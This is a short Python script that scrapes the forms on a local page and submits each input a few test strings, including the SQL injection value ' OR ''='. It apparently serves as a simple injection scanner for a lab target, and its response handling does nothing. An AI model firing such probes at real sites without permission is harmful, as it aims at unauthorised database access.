# -- coding: utf-8 --
from bs4 import BeautifulSoup
import requests
import re

errors = [
    "' OR ''='",
    "query",
    "admin",
    "1234",
    "test"
]

s = requests.Session()

def get(url):
    # Pull page contents
    page = s.get(url)
    # Parse contents
    soup = BeautifulSoup(page.text, "html.parser")
    # For each form
    for forms in soup.select('form'):
        # For each error based SQL input
        for error in errors:
            # For each input within each form
            for inputs in soup.select('input'):
                # Check if method is GET.
                if str(forms['method']).lower() == "get":
                        
                    print("[SQL] >> GET REQUEST - " + str(forms['action'] + "?" + str(inputs.get('name')) + "=" + error))

                    # Checks if action is the base URL, in order to parse the request URL
                    if str(forms['action']).startswith("http://") or str(forms['action']).startswith("https://"):
                        # GET request for each parameter with each input
                        r = s.get(str(forms['action'] + "?" + str(inputs.get('name')) + "=" + error))
                        # Handle output
                        output = BeautifulSoup(r.text, "html.parser")

                    else:
                        # GET request for each parameter with each input
                        r = s.get(url + str(forms['action'] + "?" + str(inputs.get('name')) + "=" + error))
                        # Handle output
                        output = BeautifulSoup(r.text, "html.parser")

                # Checks if method is POST
                elif str(forms['method']).lower() == "post":
                    # POST request for each parameter with each input
                    s.post(url, data={str(inputs.get('name')) : error})

                # Checks if no method was found and throws a response
                else:
                    print("[SQL] >> Method for Form: " + str(forms['id']) + " could not be found?")   

get("http://0.0.0.0:6779")